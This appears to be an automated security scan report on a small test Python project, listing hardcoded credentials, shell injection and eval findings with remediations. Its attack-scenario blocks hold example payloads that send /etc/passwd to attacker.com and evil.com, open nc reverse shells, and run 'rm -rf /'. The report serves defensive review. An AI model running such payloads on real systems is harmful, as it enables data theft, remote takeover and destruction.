# AgentSec Security Scan Report

**Target Directory:** `/mnt/c/code/AgentSec/test-scan`  
**Scan Date:** 2026-02-13T20:13:55Z  
**Scanner:** Bandit v1.x + Manual Analysis  
**Total Files Scanned:** 2 Python files

---

## Executive Summary

### Scan Statistics
- **Files Scanned:** 2 (vulnerable_app.py, utils.py)
- **Lines of Code:** 29 total (20 in vulnerable_app.py, 9 in utils.py)
- **Security Issues Found:** 4 vulnerabilities
- **Exit Code:** 1 (vulnerabilities detected)

### Severity Breakdown
| Severity | Count | Files Affected |
|----------|-------|----------------|
| 🔴 **CRITICAL** | 1 | vulnerable_app.py |
| 🔴 **HIGH** | 1 | vulnerable_app.py |
| 🟡 **MEDIUM** | 1 | vulnerable_app.py |
| 🟢 **LOW** | 1 | vulnerable_app.py |

### File Status
- ✅ **utils.py** - CLEAN (0 issues)
- ❌ **vulnerable_app.py** - CRITICAL (4 security vulnerabilities)

---

## Critical Findings

### 1. 🔴 CRITICAL: Hardcoded Credentials
**File:** `vulnerable_app.py:9-10`  
**Test ID:** Manual Detection  
**Confidence:** HIGH  
**CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)  
**MITRE ATT&CK:** T1552.001 (Credentials In Files)

**Vulnerable Code:**
```python
api_key = "sk-1234567890abcdef"
password = "admin123"
```

**Risk Assessment:**
- ⚠️ Credentials are exposed in source code
- ⚠️ Will be committed to version control (Git history)
- ⚠️ Accessible to anyone with repository access
- ⚠️ Credentials cannot be rotated without code changes
- ⚠️ Increases risk of credential theft and unauthorized access

**Exploitation Scenario:**
An attacker with code access can:
1. Extract API key and password from source code
2. Use credentials to authenticate to protected systems
3. Access historical credentials from Git commit history
4. Compromise systems even after credential rotation if old commits remain

**Remediation:**
```python
# ✅ SECURE: Use environment variables
import os
from typing import Optional

def get_api_key() -> str:
    api_key: Optional[str] = os.environ.get('API_KEY')
    if not api_key:
        raise ValueError("API_KEY environment variable not set")
    return api_key

def get_password() -> str:
    password: Optional[str] = os.environ.get('ADMIN_PASSWORD')
    if not password:
        raise ValueError("ADMIN_PASSWORD environment variable not set")
    return password

# Usage
api_key = get_api_key()
password = get_password()
```

**Immediate Actions Required:**
1. ⚠️ **REVOKE** API key `sk-1234567890abcdef` immediately
2. ⚠️ **ROTATE** password `admin123` on all systems
3. ⚠️ **AUDIT** Git history for exposed secrets
4. ⚠️ **SCRUB** Git history using `git-filter-repo` or BFG Repo-Cleaner
5. ⚠️ **MIGRATE** to environment variables or secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)

---

### 2. 🔴 HIGH: Shell Command Injection
**File:** `vulnerable_app.py:21`  
**Test ID:** B602  
**Confidence:** HIGH  
**Severity:** HIGH  
**CWE:** [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)  
**MITRE ATT&CK:** T1059.004 (Unix Shell Command Execution)

**Vulnerable Code:**
```python
def run_shell_command(cmd):
    """Run a shell command"""
    # Using subprocess can be dangerous
    output = subprocess.check_output(cmd, shell=True)
    return output
```

**Risk Assessment:**
Using `subprocess.check_output()` with `shell=True` enables shell command injection. An attacker can inject malicious commands through command separators (`;`, `&&`, `||`, `|`).

**Attack Scenarios:**
```python
# Scenario 1: Command chaining
run_shell_command("ls; rm -rf /")  # Executes both commands!

# Scenario 2: Data exfiltration
run_shell_command("cat /etc/passwd | curl -X POST http://attacker.com")

# Scenario 3: Reverse shell
run_shell_command("ls & nc -e /bin/sh attacker.com 4444")

# Scenario 4: Privilege escalation
run_shell_command("ls; sudo -i")
```

**Remediation:**
```python
# ✅ SECURE: Use shell=False with argument list
import subprocess
import shlex
from typing import List, Union

def run_shell_command(cmd: Union[str, List[str]]) -> bytes:
    """Run a shell command safely"""
    # Convert string to list if needed
    if isinstance(cmd, str):
        cmd_list = shlex.split(cmd)  # Safely parse shell command
    else:
        cmd_list = cmd
    
    # Validate command whitelist (optional but recommended)
    ALLOWED_COMMANDS = ['ls', 'cat', 'grep', 'echo']
    if cmd_list[0] not in ALLOWED_COMMANDS:
        raise ValueError(f"Command '{cmd_list[0]}' not allowed")
    
    # Execute with shell=False
    output = subprocess.check_output(cmd_list, shell=False)
    return output

# Usage examples
run_shell_command(['ls', '-l'])
run_shell_command('ls -l')  # Automatically parsed safely
```

**References:**
- [Bandit B602 Documentation](https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

### 3. 🟡 MEDIUM: Arbitrary Code Execution via eval()
**File:** `vulnerable_app.py:15`  
**Test ID:** B307  
**Confidence:** HIGH  
**Severity:** MEDIUM  
**CWE:** [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)  
**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter)

**Vulnerable Code:**
```python
def execute_user_command(user_input):
    """Execute user input - DANGEROUS!"""
    # Using eval() is very dangerous
    result = eval(user_input)
    return result
```

**Risk Assessment:**
The `eval()` function executes arbitrary Python expressions. An attacker can execute any Python code, including system commands, file operations, data exfiltration, and privilege escalation.

**Attack Scenarios:**
```python
# Scenario 1: File deletion
execute_user_command("__import__('os').system('rm -rf /')")

# Scenario 2: Data exfiltration
execute_user_command("__import__('urllib.request').urlopen('http://evil.com?data=' + open('/etc/passwd').read()).read()")

# Scenario 3: Remote code execution
execute_user_command("__import__('subprocess').Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])")

# Scenario 4: Denial of service
execute_user_command("1/0")  # Crash application
execute_user_command("while True: pass")  # CPU exhaustion

# Scenario 5: Memory access
execute_user_command("globals()")  # Access all variables
execute_user_command("__import__('sys').modules")  # Access all modules
```

**Remediation:**
```python
# ✅ SECURE OPTION 1: Use ast.literal_eval for safe literal evaluation
import ast
from typing import Union, List, Dict

def execute_user_command(user_input: str) -> Union[str, int, float, bool, list, dict, tuple, None]:
    """Safely evaluate user input - literals only"""
    try:
        # Only evaluates: strings, numbers, tuples, lists, dicts, booleans, None
        result = ast.literal_eval(user_input)
        return result
    except (ValueError, SyntaxError) as e:
        raise ValueError(f"Invalid input: Only literal expressions allowed. Error: {e}")

# ✅ SECURE OPTION 2: Use restricted execution environment
import operator
from typing import Any

ALLOWED_OPERATORS = {
    '+': operator.add,
    '-': operator.sub,
    '*': operator.mul,
    '/': operator.truediv,
}

def safe_calculate(expression: str) -> Any:
    """Safe calculator with whitelisted operations"""
    # Parse and validate expression
    # Only allow basic math operations
    # Implement your own safe parser here
    pass

# ✅ SECURE OPTION 3: Remove eval entirely
# Replace with specific functions for each use case
def handle_user_input(command_type: str, args: List[str]) -> Any:
    """Command dispatcher - no eval needed"""
    if command_type == "add":
        return int(args[0]) + int(args[1])
    elif command_type == "multiply":
        return int(args[0]) * int(args[1])
    else:
        raise ValueError(f"Unknown command: {command_type}")
```

**References:**
- [Bandit B307 Documentation](https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b307-eval)
- [Python ast.literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval)
- [Eval is Evil](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)

---

### 4. 🟢 LOW: Subprocess Module Usage
**File:** `vulnerable_app.py:5`  
**Test ID:** B404  
**Confidence:** HIGH  
**Severity:** LOW  
**CWE:** [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

**Code:**
```python
import subprocess
```

**Issue:**
The `subprocess` module is flagged as potentially dangerous. This is an informational warning requiring manual review of all subprocess usage.

**Action Taken:**
✅ Manual review completed - confirmed HIGH severity issue at line 21 (see Finding #2)

**Recommendation:**
Review all subprocess calls to ensure `shell=False` is used with validated input.

---

## File Analysis Summary

### ✅ utils.py - CLEAN
**Status:** SECURE  
**Lines of Code:** 9  
**Issues Found:** 0  

**Functions:**
- `add_numbers(a, b)` - Safe mathematical operation
- `multiply(x, y)` - Safe mathematical operation

**Conclusion:** This file contains only safe utility functions with no security vulnerabilities.

---

### ❌ vulnerable_app.py - CRITICAL
**Status:** CRITICAL VULNERABILITIES DETECTED  
**Lines of Code:** 20  
**Issues Found:** 4  

**Vulnerability Summary:**
| Line | Severity | Issue | Test ID |
|------|----------|-------|---------|
| 9-10 | 🔴 CRITICAL | Hardcoded credentials | Manual |
| 21 | 🔴 HIGH | Shell injection | B602 |
| 15 | 🟡 MEDIUM | Arbitrary code execution (eval) | B307 |
| 5 | 🟢 LOW | Subprocess import | B404 |

**Risk Score:** 9.5/10 (CRITICAL)

---

## OWASP Top 10 2021 Mapping

The vulnerabilities found map to these OWASP categories:

| OWASP Category | Vulnerabilities | Impact |
|----------------|-----------------|--------|
| **A03:2021 – Injection** | `eval()`, `subprocess(shell=True)` | Remote code execution, system compromise |
| **A07:2021 – Identification and Authentication Failures** | Hardcoded credentials | Unauthorized access, credential theft |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Vulnerability |
|--------|-----------|---------------|
| **Initial Access** | T1190 - Exploit Public-Facing Application | eval(), shell injection |
| **Execution** | T1059 - Command and Scripting Interpreter | eval(), subprocess |
| **Execution** | T1059.004 - Unix Shell | subprocess(shell=True) |
| **Credential Access** | T1552.001 - Credentials In Files | Hardcoded api_key, password |

---

## Compliance Impact

These vulnerabilities may impact compliance with:

### PCI DSS (Payment Card Industry Data Security Standard)
- **Requirement 6.5.1** - Injection flaws (eval, subprocess)
- **Requirement 8.2.1** - Strong authentication (hardcoded passwords)

### HIPAA (Health Insurance Portability and Accountability Act)
- **§164.308(a)(5)(ii)(D)** - Password Management (hardcoded credentials)
- **§164.312(a)(2)(i)** - Unique User Identification (hardcoded passwords)

### SOC 2 (System and Organization Controls)
- **CC6.1** - Logical and physical access controls (hardcoded credentials)
- **CC7.1** - System operations (command injection vulnerabilities)

### ISO 27001
- **A.9.4.1** - Information access restriction (hardcoded credentials)
- **A.14.2.5** - Secure system engineering principles (injection flaws)

---

## Recommendations

### 🔴 IMMEDIATE ACTIONS (Priority 1 - Within 24 Hours)
1. ⚠️ **REVOKE** exposed API key `sk-1234567890abcdef`
2. ⚠️ **RESET** password `admin123` on all systems
3. ⚠️ **DISABLE** `execute_user_command()` function immediately
4. ⚠️ **BLOCK** deployments until critical issues are resolved

### 🟡 SHORT-TERM FIXES (Priority 2 - Within 1 Week)
1. **Refactor** `run_shell_command()` to use `shell=False`
2. **Replace** `eval()` with `ast.literal_eval()` or remove entirely
3. **Migrate** credentials to environment variables or secrets manager
4. **Audit** Git history for exposed secrets using [truffleHog](https://github.com/trufflesecurity/trufflehog) or [gitleaks](https://github.com/gitleaks/gitleaks)
5. **Scrub** Git history if secrets found using `git-filter-repo`

### 🟢 LONG-TERM IMPROVEMENTS (Priority 3 - Within 1 Month)
1. **Implement** automated security scanning in CI/CD pipeline
2. **Configure** pre-commit hooks with Bandit
3. **Conduct** security code review training for developers
4. **Establish** secure coding guidelines and standards
5. **Deploy** secrets management solution (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)
6. **Schedule** regular penetration testing and security audits
7. **Implement** runtime application self-protection (RASP)

---

## Remediation Verification Checklist

After applying fixes, verify:

- [ ] Bandit scan shows 0 HIGH/MEDIUM issues: `bandit -r . -ll`
- [ ] No hardcoded credentials in code: `git grep -E "(password|api_key|secret).*=.*['\"]"`
- [ ] All subprocess calls use `shell=False`
- [ ] No `eval()` or `exec()` functions in production code
- [ ] Environment variables configured for credentials
- [ ] Git history scrubbed of secrets
- [ ] API keys rotated and old keys revoked
- [ ] Security tests pass in CI/CD pipeline

---

## Scan Metadata

**Bandit Command:**
```bash
bandit -r /mnt/c/code/AgentSec/test-scan -f json
```

**Bandit Configuration:**
- Profile: Default
- Tests: All enabled
- Excluded: security-scan-report.md
- Severity Levels: ALL (LOW, MEDIUM, HIGH)
- Confidence Levels: ALL (LOW, MEDIUM, HIGH)

**Exit Code:** 1 (vulnerabilities found)

**Additional Analysis:**
- Manual code review for hardcoded credentials
- Pattern matching for secrets: `grep -E "(password|api_key|secret|token)"`

---

## Next Steps

1. ✅ **Review** this report with development and security teams
2. ⏳ **Prioritize** remediation based on severity (CRITICAL → HIGH → MEDIUM → LOW)
3. ⏳ **Track** remediation progress in issue tracking system (Jira, GitHub Issues)
4. ⏳ **Re-scan** after fixes to verify resolution: `bandit -r . -ll`
5. ⏳ **Implement** baseline security scanning to prevent regression
6. ⏳ **Document** lessons learned and update secure coding guidelines

---

## Contact & Resources

**Report Generated By:** AgentSec Security Scanner  
**Powered By:** Bandit + Manual Analysis  
**Documentation:** https://bandit.readthedocs.io/  

**Security Resources:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)

**Emergency Contact:** For critical security incidents, contact your security team immediately.

---

**END OF REPORT**
